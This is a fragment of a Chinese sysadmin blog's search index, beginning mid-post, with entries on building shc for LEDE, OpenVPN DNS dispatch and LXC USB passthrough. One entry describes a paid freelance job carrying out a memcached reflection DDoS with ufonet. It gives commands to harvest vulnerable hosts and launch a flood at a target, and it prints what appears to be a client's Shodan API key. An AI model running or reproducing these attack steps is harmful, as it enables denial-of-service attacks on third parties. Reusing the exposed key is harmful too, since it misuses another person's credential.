class=\"s2\"\u003eendef\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e# This line executes the necessary commands to compile our program.\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e# The above define directives specify all the information needed, but this\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e# line calls BuildPackage which in turn actually uses this information to\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e# build a package.\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e\u003c/span\u003e\u003cspan class=\"k\"\u003e$(\u003c/span\u003e\u003cspan class=\"nb\"\u003eeval\u003c/span\u003e \u003cspan class=\"k\"\u003e$(\u003c/span\u003ecall BuildPackage,\u003cspan class=\"k\"\u003e$(\u003c/span\u003ePKG_NAME\u003cspan class=\"k\"\u003e)))\u003c/span\u003e\u003cspan class=\"s2\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e8. Compile shc ipk without errors.\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003emake package/shc/compile V=99\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e9. Building process complete witout errors.  \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003eNow we have :  \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003ebinary packages directory: source/bin/packages/aarch64_armv8-a/  \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e[SHC_BIN] = ./bin/packages/aarch64_armv8-a/base/shc_3.8.9b_aarch64_armv8-a.ipk\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e10. Copy and install SHC .ipk to LEDE device.\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003escp shc_3.8.9b_aarch64_armv8-a.ipk root@\u0026lt;LEDE device IP address or name\u0026gt;:/tmp/  \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003essh root@\u0026lt;LEDE device IP address or name\u0026gt; #IP usually 192.168.1.1  \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003eopkg install shc_3.8.9b_aarch64_armv8-a.ipk\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e11. Create test script and compile it to execute. (in LEDE shell)  \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003essh root@\u0026lt;LEDE device IP address or name\u0026gt; #IP usually 192.168.1.1\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003evi /tmp/1.sh  \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e#!/bin/sh\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003eecho \u0026#34;\u003c/span\u003ehahahaha\u003cspan class=\"s2\"\u003e\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003eshc -v -f /tmp/1.sh  \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e/tmp/1.sh.x\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e这里面有几个注意点，一个是网上有很多教程，上去就是\u003c/p\u003e","title":"Freelancer任务之六Compile an ipk file on Lede (OpenWRT)"},{"content":"这是一次差点蚀把米的过程啊，最后争议拿回了自己的手续费，白干了一场啊，真够倒霉的。\n韩国人要反射攻击。\n首先clone项目：\ngit clone https://github.com/epsylon/ufonet 原理很清楚，通过memcache的漏洞，memcache居然是UDP的，伪造源地址，发一堆请求到有漏洞的memchache，引起反射攻击。\n一堆有漏洞的机器从哪获得呢？这个韩国人真的有Shodan API，手榴弹？ 他的账号，确实可以看到一堆有毛病的机器\n0ptoLUtmkSJ8DbAvyZ8PevTRsyLoxEuN 安装python:\nwget https://www.python.org/ftp/python/2.7.14/Python-2.7.14.tgz tar zxvf Python-2.7.14.tgz cd Python-2.7.14 ./configure --prefix=/export/servers/Python2714 make make install wget -O- \u0026#34;https://bootstrap.pypa.io/get-pip.py\u0026#34; | /export/servers/Python2714/bin/python /export/servers/Python2714/bin/pip install pycurl /export/servers/Python2714/bin/pip install geoip /export/servers/Python2714/bin/pip install whois /export/servers/Python2714/bin/pip install crypto /export/servers/Python2714/bin/pip install request 先去拿一堆漏洞机器的列表\ncd ufonet /export/servers/Python2714/bin/python ./ufonet --sd \u0026#39;botnet/dorks.txt\u0026#39; --sa 轰击：\n/export/servers/Python2714/bin/python ./ufonet./ufonet -a http://target.com -r 10000 --threads 2000 ","permalink":"https://rendoumi.com/posts/20240124-freelancer_7/","summary":"\u003cp\u003e这是一次差点蚀把米的过程啊，最后争议拿回了自己的手续费，白干了一场啊，真够倒霉的。\u003c/p\u003e\n\u003cp\u003e韩国人要反射攻击。\u003c/p\u003e\n\u003cp\u003e首先clone项目：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egit clone https://github.com/epsylon/ufonet  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e原理很清楚，通过memcache的漏洞，memcache居然是UDP的，伪造源地址，发一堆请求到有漏洞的memchache，引起反射攻击。\u003c/p\u003e\n\u003cp\u003e一堆有漏洞的机器从哪获得呢？这个韩国人真的有Shodan API，手榴弹？ 他的账号，确实可以看到一堆有毛病的机器\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e0ptoLUtmkSJ8DbAvyZ8PevTRsyLoxEuN  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e安装python:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget https://www.python.org/ftp/python/2.7.14/Python-2.7.14.tgz  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etar zxvf Python-2.7.14.tgz  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003ecd\u003c/span\u003e Python-2.7.14  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e./configure --prefix\u003cspan class=\"o\"\u003e=\u003c/span\u003e/export/servers/Python2714\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emake  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emake install\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget -O- \u003cspan class=\"s2\"\u003e\u0026#34;https://bootstrap.pypa.io/get-pip.py\u0026#34;\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e /export/servers/Python2714/bin/python\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/export/servers/Python2714/bin/pip install pycurl\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/export/servers/Python2714/bin/pip install geoip\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/export/servers/Python2714/bin/pip install whois\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/export/servers/Python2714/bin/pip install crypto\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/export/servers/Python2714/bin/pip install request\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e先去拿一堆漏洞机器的列表\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003ecd\u003c/span\u003e ufonet  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/export/servers/Python2714/bin/python ./ufonet --sd \u003cspan class=\"s1\"\u003e\u0026#39;botnet/dorks.txt\u0026#39;\u003c/span\u003e --sa\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e轰击：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/export/servers/Python2714/bin/python ./ufonet./ufonet -a http://target.com -r \u003cspan class=\"m\"\u003e10000\u003c/span\u003e --threads \u003cspan class=\"m\"\u003e2000\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","title":"Freelancer任务之七memcache 放大攻击"},{"content":"雇主给了个难题，他搭建了一个openvpn，并且有两个DNS Server，一个是带AD广告过滤的，一个是不带的。这两个dns服务在同一个机器上，端口不同。\n他想让在openvpn的client端配置一下，让客户使用不同的dns server。\n找了半天，没有能修改dns port的配置。\n于是曲线救国。\n方案如下：客户端固定IP，根据不同的来源IP来分发到不同的DNS去。\n本来是想用V2EX一个哥们自己写的glider，弄了半天，不知道怎么配，不过功能肯定是能实现的。最差就是自己改go代码了。\n快速起见，用了另外一个哥们的dns-dispatcher，就是dns分发，glider是彻底的各种代理转发，链条代理，非常强悍。\n克隆dns-dispatcher代码\ngit clone https://github.com/cathuhoo/dns-dispatcher 编译：\nmake 配置，我们只配置了udp的53端口，标准的DNS端口\nvi dns-dispatch.config ; This is a test configuration file [main] file_resolvers = resolvers.txt file_policy = policy.txt file_log = /var/log/dns-dispatch.log file_pid = /var/run/dns-dispatch.pid num_threads = 3 service_port = 53 #tcpservice_port = 53 daemonize = yes 配置策略：\nvi policy.txt ip2 | * | Forward:bind2 ip1 | * | Forward:bind1 配置ip1和ip2\nvi ip1 10.10.1.2 vi ip2 10.10.1.3 配置bind1和bind2，两个dns在10.10.1.1上，端口分别是5301和5302\nvi resolvers.txt bind1|10.10.1.1|5301 bind2|10.10.1.1|5302 运行：\nsudo ./dns-dispatch -c dns-dispatch.config OK，搞定，所有的配置都在文件里，还有别的用法，大家用的话自己看文档吧。\n最后分别从10.10.1.2和10.10.1.3上面用dig 请求dns server 10.10.1.1，会得到不同的结果\ndig -t www.bbb.com @10.10.1.1 ","permalink":"https://rendoumi.com/posts/20240124_freelancer_8/","summary":"\u003cp\u003e雇主给了个难题，他搭建了一个openvpn，并且有两个DNS Server，一个是带AD广告过滤的，一个是不带的。这两个dns服务在同一个机器上，端口不同。\u003c/p\u003e\n\u003cp\u003e他想让在openvpn的client端配置一下，让客户使用不同的dns server。\u003c/p\u003e\n\u003cp\u003e找了半天，没有能修改dns port的配置。\u003c/p\u003e\n\u003cp\u003e于是曲线救国。\u003c/p\u003e\n\u003cp\u003e方案如下：客户端固定IP，根据不同的来源IP来分发到不同的DNS去。\u003c/p\u003e\n\u003cp\u003e本来是想用V2EX一个哥们自己写的glider，弄了半天，不知道怎么配，不过功能肯定是能实现的。最差就是自己改go代码了。\u003c/p\u003e\n\u003cp\u003e快速起见，用了另外一个哥们的dns-dispatcher，就是dns分发，glider是彻底的各种代理转发，链条代理，非常强悍。\u003c/p\u003e\n\u003cp\u003e克隆dns-dispatcher代码\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egit clone https://github.com/cathuhoo/dns-dispatcher  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e编译：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emake  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e配置，我们只配置了udp的53端口，标准的DNS端口\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evi dns-dispatch.config  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e This is a \u003cspan class=\"nb\"\u003etest\u003c/span\u003e configuration file\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003emain\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003efile_resolvers\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e resolvers.txt  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003efile_policy\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e policy.txt  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003efile_log\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e /var/log/dns-dispatch.log  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003efile_pid\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e /var/run/dns-dispatch.pid  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003enum_threads\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"m\"\u003e3\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eservice_port\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"m\"\u003e53\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#tcpservice_port = 53\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003edaemonize\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e yes  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e配置策略：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evi policy.txt  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eip2 \u003cspan class=\"p\"\u003e|\u003c/span\u003e * \u003cspan class=\"p\"\u003e|\u003c/span\u003e Forward:bind2  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eip1 \u003cspan class=\"p\"\u003e|\u003c/span\u003e * \u003cspan class=\"p\"\u003e|\u003c/span\u003e Forward:bind1  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e配置ip1和ip2\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evi ip1  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e10.10.1.2\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evi ip2  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e10.10.1.3  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e配置bind1和bind2，两个dns在10.10.1.1上，端口分别是5301和5302\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evi resolvers.txt  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ebind1\u003cspan class=\"p\"\u003e|\u003c/span\u003e10.10.1.1\u003cspan class=\"p\"\u003e|\u003c/span\u003e\u003cspan class=\"m\"\u003e5301\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ebind2\u003cspan class=\"p\"\u003e|\u003c/span\u003e10.10.1.1\u003cspan class=\"p\"\u003e|\u003c/span\u003e\u003cspan class=\"m\"\u003e5302\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e运行：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo ./dns-dispatch -c dns-dispatch.config  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eOK，搞定，所有的配置都在文件里，还有别的用法，大家用的话自己看文档吧。\u003c/p\u003e","title":"Freelancer任务之八openvpn的DNS分发"},{"content":"测试的同事要在测试机上安装android studio，adb直接调试手机。\n这下麻烦了，测试机实际是个lxc的容器，需要把插在宿主机usb上的手机直接过给容器。\n说下做法： 首先在宿主机上执行lsusb，查出手机USB：\n[root@localhost]# lsusb Bus 001 Device 002: ID 8087:0024 Intel Corp. Integrated Rate Matching Hub Bus 002 Device 002: ID 8087:0024 Intel Corp. Integrated Rate Matching Hub Bus 001 Device 001: ID 1d6b:0002 Linux Foundation 2.0 root hub Bus 002 Device 001: ID 1d6b:0002 Linux Foundation 2.0 root hub Bus 001 Device 014: ID 04e8:6860 Samsung Electronics Co., Ltd GT-I9100 Phone [Galaxy S II], GT-I9300 Phone [Galaxy S III], GT-P7500 [Galaxy Tab 10.1] , GT-I9500 [Galaxy S 4] Bus 001 Device 004: ID 0624:0248 Avocent Corp. Virtual Hub Bus 001 Device 005: ID 0624:0249 Avocent Corp. Virtual Keyboard/Mouse 看最长的带GT-I9100那一行，ID 04e8:6860，VendorID:ProdID，说明Vendor=04e8 ProdID=6860，记下来。\n并且记下来Bus 001，Device 014\n一切设备皆文件，看看具体的文件吧：\nls -l /dev/bus/usb/001/014 crw-rw-r--. 1 root root 189, 13 8月 29 10:31 /dev/bus/usb/001/014 记下来这个189\n然后去虚机的配置文件里 注意，我们的lxc虚机配置文件在/var/lib/docker/containers/bc2c9887fa72a59ab59f78b50677612608d40a2b73e8fd8fe0ffe25baa35edaa/config.lxc中，我们的rootfs是：\nlxc.rootfs = /var/lib/docker/devicemapper/mnt/bc2c9887fa72a59ab59f78b50677612608d40a2b73e8fd8fe0ffe25baa35edaa/rootfs So，在rootfs目录下的config.lxc文件中增加2行，让usb设备直通虚机：\nlxc.cgroup.devices.allow = c 189:* rwm lxc.mount.entry = /dev/bus/usb/001/014 /var/lib/docker/devicemapper/mnt/bc2c9887fa72a59ab59f78b50677612608d40a2b73e8fd8fe0ffe25baa35edaa/rootfs/dev/bus/usb/001/014 none bind,optional,create=file 还没完： 重启虚机，进入容器，写个udev的rules，这个没测试是否有必要，因为其实udev服务根本没在容器里跑啊\nvi /etc/udev/rules.d/51-android.rules SUBSYSTEMS==\u0026#34;usb\u0026#34;, ATTRS{idVendor}==\u0026#34;04e8\u0026#34;, ATTRS{idProduct}==\u0026#34;6860\u0026#34;, MODE=\u0026#34;0666\u0026#34;, OWNER=\u0026#34;root\u0026#34; 继续，修改容器中的adb_usb.ini，把VendorID加进去\nvi ~/.android/adb_usb.ini # ANDROID 3RD PARTY USB VENDOR ID LIST -- DO NOT EDIT. # USE \u0026#39;android update adb\u0026#39; TO GENERATE. # 1 USB VENDOR ID PER LINE. 0x04e8 重启容器，adb被装在/opt/sdk/platform-tools/路径下，进去后执行：\n/opt/sdk/platform-tools/adb start-server /opt/sdk/platform-tools/adb devices List of devices attached 0376b638 unauthorized OK搞定。\n","permalink":"https://rendoumi.com/posts/20240124-lxc_usb_pass_through/","summary":"\u003cp\u003e测试的同事要在测试机上安装\u003ccode\u003eandroid studio\u003c/code\u003e，adb直接调试手机。\u003c/p\u003e\n\u003cp\u003e这下麻烦了，测试机实际是个\u003ccode\u003elxc\u003c/code\u003e的容器，需要把插在宿主机usb上的手机直接过给容器。\u003c/p\u003e\n\u003cp\u003e说下做法： 首先在宿主机上执行lsusb，查出手机USB：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003eroot@localhost\u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"c1\"\u003e# lsusb\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eBus \u003cspan class=\"m\"\u003e001\u003c/span\u003e Device 002: ID 8087:0024 Intel Corp. Integrated Rate Matching Hub  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eBus \u003cspan class=\"m\"\u003e002\u003c/span\u003e Device 002: ID 8087:0024 Intel Corp. Integrated Rate Matching Hub  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eBus \u003cspan class=\"m\"\u003e001\u003c/span\u003e Device 001: ID 1d6b:0002 Linux Foundation 2.0 root hub  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eBus \u003cspan class=\"m\"\u003e002\u003c/span\u003e Device 001: ID 1d6b:0002 Linux Foundation 2.0 root hub  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eBus \u003cspan class=\"m\"\u003e001\u003c/span\u003e Device 014: ID 04e8:6860 Samsung Electronics Co., Ltd GT-I9100 Phone \u003cspan class=\"o\"\u003e[\u003c/span\u003eGalaxy S II\u003cspan class=\"o\"\u003e]\u003c/span\u003e, GT-I9300 Phone \u003cspan class=\"o\"\u003e[\u003c/span\u003eGalaxy S III\u003cspan class=\"o\"\u003e]\u003c/span\u003e, GT-P7500 \u003cspan class=\"o\"\u003e[\u003c/span\u003eGalaxy Tab 10.1\u003cspan class=\"o\"\u003e]\u003c/span\u003e , GT-I9500 \u003cspan class=\"o\"\u003e[\u003c/span\u003eGalaxy S 4\u003cspan class=\"o\"\u003e]\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eBus \u003cspan class=\"m\"\u003e001\u003c/span\u003e Device 004: ID 0624:0248 Avocent Corp. Virtual Hub  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eBus \u003cspan class=\"m\"\u003e001\u003c/span\u003e Device 005: ID 0624:0249 Avocent Corp. Virtual Keyboard/Mouse  